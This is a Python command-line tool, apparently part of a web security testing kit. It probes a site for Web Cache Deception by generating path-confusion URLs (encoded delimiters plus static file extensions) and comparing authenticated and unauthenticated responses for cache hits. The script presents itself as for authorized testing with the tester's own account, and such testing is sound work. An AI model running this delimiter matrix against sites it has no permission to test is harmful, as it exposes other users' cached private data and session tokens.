#!/usr/bin/env python3
"""
deception_probe.py - confirm Web Cache Deception cross-session, low false-positive (authorized only).

Model: your AUTHENTICATED response gets cached under a static-looking URL, then an UNAUTHENTICATED request
retrieves it. You prove it with YOUR OWN session + a benign private marker (e.g. your test email) - never a
real user's data. For each path-confusion variant it runs:
   COLD  : GET <base>/<random>.<ext>   WITHOUT cookie -> if the marker shows here, the content is PUBLIC (FP) -> skip.
   reqA  : GET <variant>               WITH your cookie -> private marker present? (origin serves private data here)
   reqB  : GET <variant>               WITHOUT cookie   -> marker present + cache HIT? -> DECEPTION (cross-session). *
(WEB_CACHE_TESTING_GUIDE.md §12-§15/§20.)

Usage:
  # single crafted URL you already built:
  python3 deception_probe.py -u "https://target/account/x.css" --cookie "session=YOURS" --marker "a-8f3a@poc"
  # auto-generate the delimiter matrix from a sensitive base path:
  python3 deception_probe.py --base "https://target/account" --cookie "session=YOURS" --marker "a-8f3a@poc"
"""
import sys
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass
import argparse, time, urllib.request, urllib.error
from urllib.parse import urlsplit, urlunsplit

UA = "Mozilla/5.0 (X11; Linux x86_64) deception-probe/1.0"
EXTS = ["css", "js", "jpg", "png", "ico", "svg"]
# delimiter suffixes appended to the base path (origin truncates at the decoded char; cache keys the .ext)
DELIMS = ["/{r}.{e}", ".{e}", ";{r}.{e}", "%3f{r}.{e}", "%23{r}.{e}", "%2f{r}.{e}",
          "%00{r}.{e}", "%0a{r}.{e}", "%09{r}.{e}", "%5c{r}.{e}", "%2e{e}"]


class _NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k):
        return None


_OPENER = urllib.request.build_opener(_NoRedirect)


def fetch(url, cookie, timeout):
    h = {"User-Agent": UA}
    if cookie:
        h["Cookie"] = cookie
    req = urllib.request.Request(url, headers=h, method="GET")
    try:
        r = _OPENER.open(req, timeout=timeout)
        code, hdrs, body = r.status, r.headers, r.read()
    except urllib.error.HTTPError as e:
        code, hdrs, body = e.code, (e.headers or {}), (e.read() if hasattr(e, "read") else b"")
    except Exception:
        return None, {}, ""
    return code, {k.lower(): v for k, v in hdrs.items()}, body.decode("utf-8", "replace")


def is_hit(h):
    cf = h.get("cf-cache-status", "").upper()
    if cf:
        return cf == "HIT"
    if "hit" in (h.get("x-cache", "") + h.get("x-vercel-cache", "")).lower():
        return True
    try:
        return int(h.get("age", "0")) > 0
    except (TypeError, ValueError):
        return False


def variants_for(base):
    s = urlsplit(base)
    path = s.path.rstrip("/") or "/"
    out = []
    rnd = "z" + str(int(time.time() * 1000))[-6:]
    for e in EXTS:
        for tpl in DELIMS:
            suffix = tpl.format(r=rnd, e=e)
            newpath = path + suffix if suffix.startswith((".", ";", "%", "/")) else path + "/" + suffix
            out.append(urlunsplit((s.scheme, s.netloc, newpath, "", "")))
    return out


def cold_is_public(base, marker, timeout):
    """Fetch <base>/<random>.css WITHOUT cookie: if the marker is there, content is public -> not a deception."""
    s = urlsplit(base)
    path = (s.path.rstrip("/") or "/") + "/coldpub" + str(int(time.time()))[-5:] + ".css"
    _, _, body = fetch(urlunsplit((s.scheme, s.netloc, path, "", "")), None, timeout)
    return marker in body


def test_url(url, cookie, marker, timeout):
    cA, hA, bA = fetch(url, cookie, timeout)          # authenticated
    if cA is None:
        return "err", "request failed"
    if marker not in bA:
        return "no-priv", f"status {cA}; marker NOT in the authenticated response (wrong variant/marker)"
    cB, hB, bB = fetch(url, None, timeout)            # unauthenticated (the 'attacker')
    if cB is None:
        return "err", "reqB failed"
    if marker in bB:
        if is_hit(hB):
            return "VULN", f"reqA(cookie)=marker  reqB(no-cookie)=marker + cache HIT -> CROSS-SESSION deception"
        return "LIKELY", f"reqB(no-cookie) returned the marker but no HIT header seen -> confirm it's from CACHE not public"
    return "auth-ok", f"marker private (reqB no-cookie has no marker; status {cB}) -> not cached cross-session here"


def main():
    ap = argparse.ArgumentParser(description="Web Cache Deception cross-session confirmer (authorized only).")
    g = ap.add_mutually_exclusive_group(required=True)
    g.add_argument("-u", "--url", help="a single crafted path-confusion URL you already built")
    g.add_argument("--base", help="a sensitive base URL (e.g. https://t/account) -> auto-generate the matrix")
    ap.add_argument("--cookie", required=True, help="YOUR session cookie (the 'victim' test account)")
    ap.add_argument("--marker", required=True, help="a benign PRIVATE string that only appears when authenticated")
    ap.add_argument("--timeout", type=float, default=15.0)
    ap.add_argument("--verbose", action="store_true")
    a = ap.parse_args()

    print("== web cache deception probe ==   [two-request: with-session / without-session]")
    print(f"[i] marker: {a.marker!r}")

    base_for_cold = a.base or a.url
    if cold_is_public(base_for_cold, a.marker, a.timeout):
        print("[!] the marker appears WITHOUT authentication (public content) -> this is NOT a deception.")
        print("    pick a marker that only shows when logged in (your email/CSRF token), then re-run.")
        return 0

    if a.url:
        targets = [a.url]
    else:
        targets = variants_for(a.base)
        print(f"[i] generated {len(targets)} path-confusion variants from {a.base}")

    vuln = likely = 0
    for url in targets:
        verdict, why = test_url(url, a.cookie, a.marker, a.timeout)
        short = urlsplit(url).path
        if verdict == "VULN":
            vuln += 1
            print(f"  [VULNERABLE] {short}")
            print(f"       -> {why} *")
        elif verdict == "LIKELY":
            likely += 1
            print(f"  [LIKELY]     {short}  ({why})")
        elif verdict in ("no-priv", "auth-ok") and a.verbose:
            print(f"  [no]         {short}  ({why})")
        elif verdict == "err" and a.verbose:
            print(f"  [err]        {short}  ({why})")

    print()
    if vuln:
        print(f"[+] {vuln} confirmed deception variant(s). Grade by the leaked body: token/reset/api-key = CRITICAL (ATO);")
        print("    CSRF/PII = HIGH. You proved cross-session theft with YOUR OWN accounts + a benign marker - STOP (guide §15/§18).")
    elif likely:
        print(f"[~] {likely} likely variant(s) - confirm reqB is served from CACHE (HIT/Age), not public content (guide §17).")
    else:
        print("[-] no cross-session deception on these variants. Try more extensions/delimiters, a different base path,")
        print("    or check whether static resources are cached at all (cache_detect.py).")
    return 0


if __name__ == "__main__":
    sys.exit(main())
